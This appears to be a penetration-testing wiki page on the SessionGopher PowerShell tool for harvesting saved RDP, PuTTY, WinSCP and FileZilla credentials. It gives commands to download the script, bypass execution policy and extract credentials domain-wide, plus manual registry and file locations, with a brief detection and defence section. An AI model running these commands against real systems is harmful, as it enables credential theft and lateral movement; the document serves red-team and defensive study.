# Extracting Passwords Stored in Services  

## What is SessionGopher?  

**SessionGopher** is a **PowerShell script** designed to extract **saved credentials** from remote desktop, WinSCP, FileZilla, PuTTY, and other applications. It is primarily used for **post-exploitation** and **security auditing** to identify stored passwords in various services.  

[SessionGopher GitHub Repository](https://github.com/Arvanaghi/SessionGopher)  

## Downloading and Running SessionGopher  

### 1. Download the Script

- To use **SessionGopher**, first download the script:  

```powershell
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGopher.ps1" -OutFile ".\SessionGopher.ps1"
```

### 2. Import the Module

- After downloading, import the script into PowerShell:

```powershell
Import-Module .\SessionGopher.ps1
```

- If execution policies block script execution, bypass them using:

```powershell
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
```

## Extracting Passwords from Services

### 1. Extract Credentials from All Machines in the Domain

- To extract saved passwords across the entire domain, use:

```powershell
Invoke-SessionGopher -AllDomain -o
```

> The `-o` flag outputs the results to a file.

### 2. Extract Credentials Using Specific Domain Credentials

- If authentication is required, specify the **username** and **password**:

```powershell
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

> Replace `domain.com\adm-arvanaghi` with your actual **domain username** and `s3cr3tP@ss` with the **password**.

## Conclusion

- SessionGopher is a powerful tool for extracting **saved credentials** from multiple services in Windows environments. While useful for **red teams** and **system administrators**, it must be used **ethically** and **legally**.

## What it finds — and the manual equivalents

SessionGopher decrypts saved sessions from the tools admins use to connect elsewhere — each is also recoverable by hand:

| Source | Manual location |
|--------|-----------------|
| **RDP** | saved `.rdp` files + `cmdkey /list` (`TERMSRV/*`) — decrypt with DPAPI ([DPAPI and Saved Credentials](DPAPI-and-Saved-Credentials.md)) |
| **PuTTY** | `HKCU\Software\SimonTatham\PuTTY\Sessions` (proxy passwords in cleartext) |
| **WinSCP** | `HKCU\Software\Martin Prikryl\WinSCP 2\Sessions` or `WinSCP.ini` (obfuscated, reversible) |
| **FileZilla** | `%APPDATA%\FileZilla\sitemanager.xml` / `recentservers.xml` (Base64) |

```cmd
:: quick PuTTY proxy-password check without the tool
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr /i "Proxy HostName"
```

Recovered session credentials frequently unlock a more privileged account or a lateral hop.

## Detection and defenses

- **Detection:** `SessionGopher`/mass session-registry reads, access to `sitemanager.xml`/`WinSCP.ini`, `cmdkey /list`.
- **Defenses:** do not save session passwords in these clients; clear stored sessions; use credential vaults / just-in-time access.
## Related
- [Password Mining](Password-Mining.md) — parent hub
- [Password in Windows Registry](Password-in-Windows-Registry.md) — service creds stored in the registry
- [Services Exploitation](../Services-Exploitation/Services-Exploitation.md) — abusing the services whose creds are recovered
- [Windows Privilege Escalation](../README.md) — escalation context
